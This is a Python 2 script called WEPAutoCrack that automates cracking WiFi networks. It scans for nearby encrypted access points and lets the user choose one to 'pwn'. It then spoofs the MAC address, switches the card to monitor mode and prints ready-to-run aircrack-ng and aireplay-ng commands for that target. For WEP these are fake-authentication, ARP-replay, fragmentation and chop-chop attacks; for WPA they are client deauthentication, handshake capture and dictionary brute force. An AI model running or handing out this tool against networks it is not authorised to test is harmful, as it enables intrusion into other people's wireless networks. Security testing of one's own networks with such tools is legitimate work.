#!/usr/bin/env python

#
# Copyright 2011-2012 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
#
#
# --------- WEPAutoCrack ----------
#             by zx2c4
# ---------------------------------
#
# This utility terminates disruptive daemons, scans for networks,
# places your wifi card into monitor mode, switches to the right channel,
# fakes a random MAC address, and builds a "choose your own adventure"
# instruction sequence for the particular access point you choose to
# crack, for use with aircrack-ng for cracking WEP passwords, and finally
# resets your daemons once you've found a password.
#
# Be sure to look at the pwn() function. There are /etc/init.d/ commands in
# there to shutdown and startup your system's networking services. Here you
# will find how I have my gentoo box setup, but you'll likely need to
# change it to suit your own needs. It should be trivial -- stopping and
# starting NetworkManager, if you use that, or whatever your situation
# is. There are two "CHANGE ME" blocks below. Find them. Edit them.
#
# greetz to gohu for iwlist parsing code at
# https://bbs.archlinux.org/viewtopic.php?pid=737357
#

import sys
import subprocess
import os
import signal
import time

def pwn(interface, network):
	print "[+] Acquiring MAC address:",
	f = open("/sys/class/net/%s/address" % interface, "r")
	realMac = f.read().strip().upper()
	f.close()
	print realMac

	def restore(signum=None, frame=None):
		try:
			proc.terminate()
		except:
			pass
		os.system("reset")

		print "[+] Restoring wifi card"
		os.system("ifconfig %s down" % interface)
		os.system("macchanger -m %s %s" % (realMac, interface))

		# BEGIN CHANGE OR REMOVE ME
		print "[+] Resetting module to work around driver bugs"
		os.system("rmmod iwldvm")
		os.system("rmmod iwlwifi")
		os.system("modprobe iwlwifi")
		time.sleep(2)
		# END CHANGE OR REMOVE ME

		os.system("iwconfig %s mode managed" % interface)
		os.system("ifconfig %s up" % interface)

		print "[+] Starting stopped services"
		# BEGIN CHANGE ME
		os.system("/etc/init.d/wpa_supplicant start")
		os.system("/etc/init.d/dhcpcd start")
		# END CHANGE ME

		sys.exit(0)

	signal.signal(signal.SIGTERM, restore)
	signal.signal(signal.SIGINT, restore)

	print "[+] Shutting down services"
	# BEGIN CHANGE ME
	os.system("/etc/init.d/wpa_supplicant stop")
	os.system("/etc/init.d/dhcpcd stop")
	# END CHANGE ME

	print "[+] Setting fake MAC address"
	os.system("ifconfig %s down" % interface)
	os.system("macchanger -r %s" % interface)
	f = open("/sys/class/net/%s/address" % interface, "r")
	mac = f.read().strip().upper()
	f.close()

	print "[+] Setting wireless card to channel %s" % network["Channel"]
	os.system("iwconfig %s mode managed" % interface)
	os.system("ifconfig %s up" % interface)
	os.system("iwconfig %s channel %s" % (interface, network["Channel"]))
	os.system("ifconfig %s down" % interface)
	os.system("iwconfig %s mode monitor" % interface)
	os.system("ifconfig %s up" % interface)
	os.system("iwconfig %s" % interface)
	
	if network["Encryption"].startswith("WEP"):
		instructions = """
=== Capture IVs ==
airodump-ng -c CHANNEL --bssid BSSID -w output INTERFACE

== Get Deauthetication Packets (Fake Authentication) ==
aireplay-ng -1 0 -e 'NAME' -a BSSID -h MAC INTERFACE
OR
aireplay-ng -1 6000 -o 1 -q 10 -e 'NAME' -a BSSID -h MAC INTERFACE
* the latter is good for persnikitty stations

== Request ARP Packets ==
aireplay-ng -3 -b BSSID -h MAC INTERFACE
* if successful, skip the next three steps and move to analyze

== Fragmentation Attack (if requesting ARPs didn't work - no users on network) ==
aireplay-ng -5 -b BSSID -h MAC INTERFACE
* use this packet? yes
* if successful, skip the next step and construct an arp packet

== Chop-Chop Attach (if fragmentation fails) ==
aireplay-ng -4 -b BSSID -h MAC INTERFACE
* use this packet? yes

== Construct ARP Packet ==
packetforge-ng -0 -a BSSID -h MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w arp-request
* k source, l destination - change for persnikittiness

= Inject Constructed ARP (if fragmentation or chop-chop) ==
aireplay-ng -2 -r arp-request INTERFACE
* use this packet? yes

== Analyze ==
aircrack-ng -z -b BSSID output*.cap
"""
	elif network["Encryption"].startswith("WPA"):
		instructions = """
== Collect 4-way Authentication Handshake ==
airodump-ng -c CHANNEL --bssid BSSID -w psk INTERFACE

== Deauthenticate Wireless Client ==
aireplay-ng -0 1 -a BSSID -c CLIENT INTERFACE

== Brute Force ==
cat /usr/share/dict/* | aircrack-ng -w - -b BSSID psk*.cap
"""
	else:
		instructions = "Wrong encryption type"

	instructions = instructions.replace("NAME", network["Name"]).replace("BSSID", network["Address"]).replace("MAC", mac).replace("INTERFACE", interface).replace("CHANNEL", network["Channel"])
	proc = subprocess.Popen("less", stdin=subprocess.PIPE)
	proc.communicate(input=instructions)
	proc.wait()

	restore()

def get_name(cell):
	return matching_line(cell, "ESSID:")[1:-1]

def get_quality(cell):
	quality = matching_line(cell, "Quality=").split()[0].split('/')
	return str(int(round(float(quality[0]) / float(quality[1]) * 100))).rjust(3) + " %"

def get_channel(cell):
	return matching_line(cell, "Channel:")

def get_encryption(cell):
	enc = ""
	if matching_line(cell, "Encryption key:") == "off":
		enc = "Open"
	else:
		for line in cell:
			matching = match(line, "IE:")
			if matching != None:
				wpa = match(matching, "WPA")
				if wpa != None:
					enc = "WPA"
				else:
					wpa = match(matching, "IEEE 802.11i/WPA2")
					if wpa != None:
						enc = "WPA2"
		if enc == "":
			enc = "WEP"
	return enc

def get_address(cell):
	return matching_line(cell, "Address: ")

rules = {"Name":get_name,
	 "Quality": get_quality,
	 "Channel": get_channel,
	 "Encryption": get_encryption,
	 "Address": get_address
	}

def sort_cells(cells):
	sortby = "Quality"
	reverse = True
	cells.sort(None, lambda el: el[sortby], reverse)

columns = ["#", "Name", "Address", "Quality", "Channel", "Encryption"]

def matching_line(lines, keyword):
	for line in lines:
		matching = match(line,keyword)
		if matching != None:
			return matching
	return None

def match(line,keyword):
	line = line.lstrip()
	length = len(keyword)
	if line[:length] == keyword:
		return line[length:]
	else:
		return None

def parse_cell(cell):
	parsed_cell = {}
	for key in rules:
		rule = rules[key]
		parsed_cell.update({ key: rule(cell) })
	return parsed_cell

def print_table(table):
	widths=map(max, map(lambda l:map(len, l), zip(*table)))

	justified_table = []
	for line in table:
		justified_line = []
		for i, el in enumerate(line):
			justified_line.append(el.ljust(widths[i] + 2))
		justified_table.append(justified_line)
	
	for line in justified_table:
		for el in line:
			print el,
		print

def print_cells(cells):
	table = [columns]
	counter = 1
	for cell in cells:
		cell_properties=[]
		for column in columns:
			if column == '#':
				cell_properties.append(str(counter))
			else:
				cell_properties.append(cell[column])
		table.append(cell_properties)
		counter += 1
	print_table(table)

def main():
	print "+------------------------+"
	print "+                        +"
	print "+      WEPAutoCrack      +"
	print "+        by zx2c4        +"
	print "+                        +"
	print "+------------------------+"
	print
	if len(sys.argv) != 2:
		print "You must supply the wifi card name as an argument."
		return
	if os.getuid() != 0:
		print "You must be root."
		return

	print "[+] Scanning..."
	proc = subprocess.Popen(["iwlist", sys.argv[1], "scanning"], stdout=subprocess.PIPE)
	cells=[[]]
	parsed_cells=[]
	for line in proc.stdout:
		cell_line = match(line, "Cell ")
		if cell_line != None:
			cells.append([])
			line = cell_line[-27:]
		cells[-1].append(line.rstrip())
	cells = cells[1:]
	for cell in cells:
		parsed_cells.append(parse_cell(cell))
	sort_cells(parsed_cells)
	encrypted_cells = []
	for cell in parsed_cells:
		if cell["Encryption"] != "Open":
			encrypted_cells.append(cell)

	if len(encrypted_cells) == 0:
		print "[-] Could not find any wireless networks. Goodbye."
		return

	print_cells(encrypted_cells)
	print
	try:
		network = int(raw_input("Which network would you like to pwn? [1-%s] " % len(encrypted_cells))) 
	except:
		network = -1
	
	if network > len(encrypted_cells) or network < 1:
		return
	
	pwn(sys.argv[1], encrypted_cells[network - 1])
	
main()
